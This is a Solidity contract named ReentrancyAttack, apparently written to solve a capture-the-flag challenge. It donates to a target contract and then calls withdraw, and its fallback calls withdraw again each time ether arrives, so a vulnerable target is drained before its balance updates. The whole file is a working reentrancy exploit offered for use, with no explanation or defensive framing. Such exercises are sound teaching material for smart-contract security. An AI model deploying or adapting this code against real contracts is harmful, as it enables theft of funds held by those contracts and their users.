// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrancy {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;

    function balanceOf(address _who) external view returns (uint256 balance);
}

contract ReentrancyAttack {
    IReentrancy public reentrancy;

    constructor(address _target) {
        reentrancy = IReentrancy(_target);
    }

    function attack() public payable {
        uint256 donateAmount = msg.value;
        reentrancy.donate{value: donateAmount}(address(this));

        reentrancy.withdraw(donateAmount);
    }

    fallback() external payable {
        reentrancy.withdraw(msg.value);
    }
}
